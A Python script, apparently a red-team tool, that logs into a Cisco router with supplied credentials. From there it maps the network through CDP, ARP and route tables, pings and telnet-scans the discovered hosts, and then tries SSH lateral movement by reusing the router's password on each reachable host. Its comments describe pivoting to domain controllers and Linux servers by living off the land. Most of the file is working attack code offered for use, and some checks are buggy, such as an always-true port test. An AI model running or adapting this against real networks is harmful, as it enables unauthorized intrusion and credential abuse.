#!/usr/bin/env python
import pprint
from manuf import manuf
from netmiko import ConnectHandler
import re
from netaddr import *
import ipaddress
import threading
import networkx as nx
import matplotlib.pyplot as plt
import time
import sys
import json
from netaddr import IPNetwork



#pull it all off over 1 connection even the lateral movement and credential reuse except the ping:)
#as possibly lateraly move into the network to things like Linux Servers,Domain Controllers etc
#this just makes it easier to get the job done via CPE devices or routers that run at  isps redteam type tool
#live off the land use native cisco tools to do our work
#please do not use this to hurt anyone the only reason I wrote this is I couldn't find anything to do it
#Gain visibility and take inventory of all devices on Your network 
#also allows you to check for credential reuse never use the same pass on cisco that you do for any other linux systems
#this tool will support up to 70 different devices roughly sure some tweaking to class is needed but this is just a demo
#one could parse the vendor from the mac and loosley match to device array we could store and use to pivot next device
#like if we discover a paloalto device we could mod the dict to connect on the fly in a later version


class TryThatLateral:
  #make default class router type cisco_ios but allow changing by using default
  def __init__(self,target_name,target,user,password,enable_word,device_type='cisco_ios'):
    self.nodes = {'Router1': 'mainrouter'}
    self.Target_Name = target_name
    self.pivotable_ips = []
    self.service_ports = [22]
    self.cdp_command = "show cdp neighbor detail"
    self.show_arp = "sh ip arp"
    self.sh_route = "sh ip route br"
    self.ping_command = "ping "
    self.sh_vlan = "sh vlan 1"
    self.vlan1_ports = []
    self.username = user
    self.target = target
    self.password = password
    self.enable_secret = enable_word
    self.responding_ips = []
    self.discovered_ips = []
    self.cidrs = []
    self.lateral_movement = []
    self.possible_linux_laterals = []
    self.device_type = device_type
    self.open_service_ips = []
    #self.lateral_artwork = [] todo 
    self.ssh_device = {
                    'device_type': self.device_type,
                    'ip': self.target,
                    'username': self.username,
                    'password': self.password,
                    'port': 22,
                    'timeout': 10,
                    'session_timeout': 20,
                    'secret':self.enable_secret,
                    }

    self.net_connect =  ConnectHandler(**self.ssh_device)



  def initiate_draw(self):
      #determine hosts connected to main router via cdp and draw diagram
      cdp_dict = self.cdp_extractor()
      if cdp_dict:
         relation_string = "{'Router1':["
         for key, value in enumerate(cdp_dict.iteritems()):
             if key != len(cdp_dict) - 1:
                relation_string += "'"+str(value[0])+"'"+","
       
             else:
                relation_string += "'"+str(value[0])+"'"
       
         relation_string += "]}"
         print("CDP Neighbors Enumerated Drawing Network Diagram\n")
         try:
            self.draw_diagram(relation_string)
         except:
            pass
      else:
         print("Apparently CDP Is Disabled Or No Peers Exist")
         pass



  def draw_diagram(self,connection):
      json_acceptable_string = connection.replace("'", "\"")
      connection = json.loads(json_acceptable_string)
      G=nx.Graph()
      try:
         for i in self.nodes:
             G.add_node(i, name = i)
 
         for j in connection:
             for k in range(0, len(connection[j])):
                 G.add_edge(j, connection[j][k])

         nx.draw(G, with_labels=True, node_size=10, node_color="green", node_shape="s", alpha=0.5, linewidths=20)
         plt.show()

      except:
          pass


  def ping_it(self,device_type,ip, username, password, enable_secret,target_ips):
      ssh_connection = ConnectHandler(
      device_type='cisco_ios',
      ip=ip,
      username=username,
      password=password,
      secret=enable_secret
      )
      ssh_connection.enable()

      # prepend the command prompt to the result (used to identify the local host)
      result = ssh_connection.find_prompt() + "\n"
      
     
      target_ips = target_ips[0:35]
      for ip in target_ips:
          try:
             result = ssh_connection.send_command('ping ip '+str(ip), delay_factor=1)
             if result:
                print(result)
                if "!" in result:
                   print("Success  Host Reachable Via ICMP")
                   self.responding_ips.append(ip)

                if "Reply to request" in result:
                   newcheck = result.split()
                   ipPattern = re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
                   for attempt in newcheck:
                       findIP = re.findall(ipPattern,attempt)
                       if findIP:
                          # this is needed to catch the late responding ips 
                          print("IP {} Responded late to a ping but we Got it".format(str(findIP)))
                          for ips in findIP:
                              self.responding_ips.append(str(ips))
                else:
                    print("Nope Not Responding TO A Ping")
                           
          except:
               pass

      ssh_connection.disconnect()     


                

  def get_ip_routes(self):
      result = ""
      try:
         
         data = self.net_connect.send_command(self.sh_route)
         result += data
        
      except:
        pass

      
      for line in result.split():
          ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', line )
          if ip:
             try:
                results = set(line.split())
                for lines in results:
                    if "0.0.0.0"  in lines:
                       pass

                    else:
                        
                        
                        self.cidrs.append(lines)
                        
             except:
                pass
      return  self.cidrs  
                  
                               
                                 


  def try_lateral_port_scan(self,extracted_ips):
      
      #port scan via telnet
      try:
         my_new_list = set(extracted_ips[0:35])
         print("in try lateral")
         print(my_new_list)
         print(self.net_connect.find_prompt())
         for hosts in set(my_new_list):
             try:
                for ports in self.service_ports:
                    print("Attempting port scan of {} {}").format(hosts,ports)
                    command = "telnet {} {}".format(hosts,ports)#credential reuse lateral movement
                    try:
                       output = self.net_connect.send_command(command)
                       print(output)
                       #parse the  response out of telnet request to leak remote service banner
                       if "Open" or  "SSH-2.0-OpenSSH" or "SSH" in output:
                           local_dict = {'Host':hosts,'Port':ports}
                           print("Success port is open Lateral Movement is Possible Via SSH")
                           self.open_service_ips.append(local_dict)
                           
                           
                           #call basic ssh hopper function here to take over the channel and lateraly move
                           try:
                               print("Now Attempting Lateral Movement on device {}".format(hosts))
                               self.ssh_hopper(hosts) 
                           except:
                                pass
                           
                       else:
                           print(output)
                           print("Port Not Open")
                    except:
                         pass

             except:
                   pass
        
      except:
          pass

     
      

  #used to return manafacturer of found device via mac
  def get_manafacturer(self,mac_address):
      p = manuf.MacParser(update=True)
      mac_vendor = p.get_all(mac_address)
      print(mac_vendor)
      if mac_vendor:
         return mac_vendor
      else:
         pass



   
  def ssh_hopper(self,ip):
      
      # SSH Connection to first Device
      print("SSH Lateral Movement Preperation")
      # Make sure SSH connection is working at this point
      print("SSH prompt: {}".format(self.net_connect.find_prompt()))

      # Use raw read/write to SSH into device2
      self.net_connect.write_channel("ssh {}\n".format(ip) )
      time.sleep(1)
      output = self.net_connect.read_channel()
      if 'ssword' in output:
          self.net_connect.write_channel(self.net_connect.password + '\n')#credential reuse
      time.sleep(1)
      output += self.net_connect.read_channel()

      # Verify you logged in successfully
      print(output)
        
        
  def cdp_extractor(self):
      
      try:
         
         data = self.net_connect.send_command(self.cdp_command)
         print(data)
         return self.parse_cdp(data)
        
      except:
          pass



    
  def parse_cdp(self,cdp_data):
      
      network_devices = {}
      # Break the cdp neighbor data up into lines
      cdp_data_line = cdp_data.split("\n")

      # Reset hostname for each cdp output
      hostname = ''

      # Iterate over each line of the cdp data
      for line in cdp_data_line:

          # As a precaution set hostname to '' on every device divider
          if '----------------' in line:
              hostname = ''

          # Processing hostname
          if 'Device ID: ' in line:
             (junk, hostname) = line.split('Device ID: ')
             hostname = hostname.strip()
             if not hostname in network_devices:
                network_devices[hostname] = {}

          # Processing IP
          if 'IP address: ' in line:
              (junk, ip) = line.split('IP address: ')
              ip = ip.strip()

              if hostname:
                 network_devices[hostname]['ip'] = ip

          # Process vendor, model, and device_type
          if 'Platform: ' in line:
             try:
                (platform, capabilities) = line.split(',')

                # Process vendor and model
                (junk, model_vendor) = platform.split("Platform: ")
                (vendor, model) = model_vendor.split()

                # Process device_type
                (junk, capabilities) = capabilities.split("Capabilities: ")
                if 'Router' in capabilities:
                   device_type = 'router'
                elif 'Switch' in capabilities:
                   device_type = 'switch'
                else:
                   device_type = 'unknown'

                if hostname:
                   network_devices[hostname]['vendor'] = vendor
                   network_devices[hostname]['model'] = model
                   network_devices[hostname]['device_type'] = device_type
             except:
                 pass
      return network_devices




  
  def mac_extractor(self):
    
    #this will return a list of dicts with ip mac and manufacturer of card as well as vlan
    
    data = ""
    try:
        #net_connect.send_command("set length 0")
        data += self.net_connect.send_command(self.show_arp)
        print('\n')
        print('----------------------------------------------------------------------------------------------')
        print('                          Entering Mac Address Extraction                                     ')
        print('----------------------------------------------------------------------------------------------')
        print(data)
        print('----------------------------------------------------------------------------------------------')
        print('                   Macc Addys Extracted Beginning Manufacturer lookup                         ')
        print('----------------------------------------------------------------------------------------------')
        
    except:
        pass

    
    ip_info = []
    for line in data.split('\n'):
         ipPattern = re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
         mac_regex = '([a-fA-F0-9]{2}[:|\-]?){6}' 
         
         
         ip = ""
         mac = ""
         manufacturer = ""
         vlan = ""
         for lines in line.split():
             
             if "Vlan" in lines:
                 print(lines)
                 vlan += lines
                 self.vlan1_ports.append(lines)
                  
             if len(lines) > 9:
                findIP = re.findall(ipPattern,lines)
                
                if findIP:
                   ip += str(lines)
                else:
                   if "Incomplete" not in lines:
                      text = lines
                      text = text.replace('.', '').upper()   # a little pre-processing
                      out = ':'.join([text[i : i + 2] for i in range(0, len(text), 2)])
                      print(out)
                      try:
                          c = re.compile(mac_regex).finditer(out)
                          if c:
                             for y in c:
                                 mac_addy = out[y.start(): y.end()]
                                 mac += str(mac_addy)
                                        
                      except:
                            pass
         
         if ip:
            if mac:
               try:
                   manufacturer = self.get_manafacturer(mac)
                   
               
               except:
                    pass
                  
            if not mac:
               mac += "null"
               
         
         local_info = {"IP":ip,"Mac":mac,"Manufacturer":manufacturer,"Vlan":vlan}
         ip_info.append(local_info)
         
    print('----------------------------------------------------------------------------------------------')
    print('                               Finished Extracting  Info                                          ')
    print('----------------------------------------------------------------------------------------------')
    print('\n')
    
    return ip_info





  def setup_lateral(self):
     
      hosts_in = []
      lateral_movements = self.mac_extractor()
      if lateral_movements: 
         print(lateral_movements)
      else:
         print("No Info Parsed From Show Ip Arp Command" )
          
      for ip_info in lateral_movements:
          print(ip_info['IP'])
          if ip_info['IP']:
             self.discovered_ips.append(ip_info['IP'])
              
          else:
             pass
                 

      hosts_in = list(dict.fromkeys(hosts_in))
      self.discovered_ips += hosts_in
                
                  
    
          
def main():
  host = sys.argv[1]
  user = sys.argv[2]
  password = sys.argv[3]
  enable_secret = sys.argv[4]

  

  Lateral_Mover  = TryThatLateral("fictional company",host,user,password,enable_secret)
  if not Lateral_Mover.net_connect:# check for connection if it fails bail
     sys.exit()
  #draw cdp relationship to connected routers
  print('\n')
  print('----------------------------------------------------------------------------------------------')
  print('                        Beginning CDP  Enumeration                                            ')
  print('----------------------------------------------------------------------------------------------')
  
  my_thread = threading.Thread(target=Lateral_Mover.initiate_draw, args=())
  my_thread.start()
  my_thread.join()


 
  
  my_thread = threading.Thread(target=Lateral_Mover.setup_lateral, args=())
  my_thread.start()
  my_thread.join()

  try:
      print('----------------------------------------------------------------------------------------------')
      print('                                   Getting Routes                                             ')
      print('----------------------------------------------------------------------------------------------')
      print('\n')
      result= Lateral_Mover.get_ip_routes()
      if result:
         print(result)

      
            
  except:
      pass
    
  print('----------------------------------------------------------------------------------------------')
  print('                                   Vlans Detected                                             ')
  print('----------------------------------------------------------------------------------------------')
  print('\n')
  for vlans in  set(Lateral_Mover.vlan1_ports):
      print '{}  Detected   '.format(vlans)
      if "vlan1" in vlans:
         print("!!!!!You Should never Use VLAN1 this is extremely insecure!!!!!")
         print("!!!!!By Default cisco ships with the Native Vlan assigned to all switch ports!!!!!")
         print("!!!!!You Should Create Vlans and assign the ports to help Secure !!!!!!")
  print('\n')
  print('----------------------------------------------------------------------------------------------')
  print('                                   Cidr\'s Detected                                           ')
  print('----------------------------------------------------------------------------------------------')
  print('\n')
  extracted_ips = []
  for Detected_ranges in  Lateral_Mover.cidrs:
      try:
         ips = IPNetwork(Detected_ranges)
         ips_to_test = set(ips)
         if ips_to_test:
            print 'Ip Range Detected {} '.format(Detected_ranges) + "\n"
            print("Contains: "+str(len(ips_to_test)) + " ips")
            for ip2test in ips_to_test:
                extracted_ips.append(str(ip2test))
     
                
      except:
         pass
      


  print('\n')
  print('----------------------------------------------------------------------------------------------')
  print('                                   Ip\'s  Extracted Performing Ping                           ')
  print('----------------------------------------------------------------------------------------------')
  print('\n')
  print(extracted_ips)
  my_thread = threading.Thread(target=Lateral_Mover.ping_it, args=(Lateral_Mover.device_type,host,user,password,enable_secret,extracted_ips))
  my_thread.start()
  my_thread.join()

  print('\n')
  print('----------------------------------------------------------------------------------------------')
  print('                                   Ping Complete Following Hosts Responded                    ')
  print('----------------------------------------------------------------------------------------------')
  print('\n')
  for alive_hosts in set(Lateral_Mover.responding_ips):
      print(alive_hosts)

  if Lateral_Mover.responding_ips:
     print('\n')
     print('----------------------------------------------------------------------------------------------')
     print('                                   Attempting Port Scan Via Telnet                            ')
     print('----------------------------------------------------------------------------------------------')
     print('\n')
     my_thread = threading.Thread(target=Lateral_Mover.try_lateral_port_scan, args=(Lateral_Mover.responding_ips,))
     my_thread.start()
     my_thread.join()


  print('\n')
  print('----------------------------------------------------------------------------------------------')
  print('                                   Attempting To Laterally Move Into Devices                  ')
  print('----------------------------------------------------------------------------------------------')
  print('\n')
  for hosts in Lateral_Mover.open_service_ips:
      if hosts:
          print("now we attempt to laterally move into the device {}".format(hosts))
      
      else:
           print("No Devices Were Detected That Allowed Lateral Movement")
          
      
      
main()
